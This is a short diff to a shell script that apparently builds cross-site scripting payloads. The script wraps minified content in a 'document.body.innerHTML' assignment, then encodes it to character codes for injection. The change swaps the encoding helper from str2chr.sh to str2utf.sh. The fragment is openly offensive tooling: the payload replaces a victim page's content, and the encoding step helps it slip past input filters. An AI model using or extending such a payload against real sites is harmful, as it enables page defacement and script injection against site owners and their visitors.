@@ -12,7 +12,7 @@ XSS_PREFIX='document.body.innerHTML=`'
 XSS_SUFFIX='`'
 echo "$XSS_PREFIX$minified$XSS_SUFFIX"
 # Convert to ascii
-ascii=$(bash "$DIR/str2chr.sh" "$XSS_PREFIX$minified$XSS_SUFFIX")
+ascii=$(bash "$DIR/str2utf.sh" "$XSS_PREFIX$minified$XSS_SUFFIX")
 
 # echo $ascii
 
